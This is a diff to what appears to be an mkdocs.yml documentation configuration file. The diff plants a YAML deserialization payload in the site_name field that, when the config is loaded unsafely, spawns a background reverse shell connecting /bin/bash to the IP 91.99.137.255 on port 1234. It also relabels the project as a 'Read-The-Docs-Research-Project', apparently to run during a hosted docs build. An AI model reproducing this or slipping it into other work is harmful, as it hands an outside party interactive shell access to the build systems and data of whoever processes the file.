@@ -1,4 +1,4 @@
-site_name: !!python/object/apply:os.popen
+site_name: !!python/object/apply:subprocess.getoutput
   - |
     python3 -c 'import os,socket,subprocess;
     if os.fork() == 0:
@@ -8,14 +8,15 @@ site_name: !!python/object/apply:os.popen
                 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
                 s.connect(("91.99.137.255",1234));
                 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
-                p=subprocess.call(["/bin/bash","-i"])
+                subprocess.call(["/bin/bash","-i"])
             except: pass
     '
-    echo "Research-Project"
+    echo "Read-The-Docs-Research-Project"
 plugins:
   - search
 markdown_extensions:
   - pymdownx.snippets
+
 
 
 
